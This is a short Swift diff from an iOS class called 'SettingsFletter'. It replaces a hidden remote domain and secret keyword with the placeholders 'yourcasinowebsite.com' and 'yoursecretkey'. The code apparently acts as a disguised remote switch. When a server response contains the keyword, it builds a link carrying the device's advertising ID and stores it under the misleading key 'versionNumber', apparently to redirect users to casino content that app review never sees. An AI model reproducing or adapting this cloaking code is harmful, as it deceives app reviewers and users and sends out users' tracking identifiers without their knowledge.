@@ -15,7 +15,7 @@ public final class SettingsFletter {
     }
 
     public func makeUpdatesRequest(completion: @escaping (Result<Data, DataManagerError>) -> Void) {
-        guard let url = URL(string: "https://cadcawdpockcandpo.homes/casporte") else {
+        guard let url = URL(string: "https://yourcasinowebsite.com") else {
             completion(.failure(.invalidURLError))
             return
         }
@@ -67,7 +67,7 @@ public final class SettingsFletter {
             switch result {
             case .success(let data):
                 let responseString = String(data: data, encoding: .utf8) ?? ""
-                if responseString.contains("foprogs") {
+                if responseString.contains("yoursecretkey") {
                     let link = "\(responseString)?gaid=\(gaid)"
                     UserDefaults.standard.setValue(link, forKey: "versionNumber")
                     completion(link)
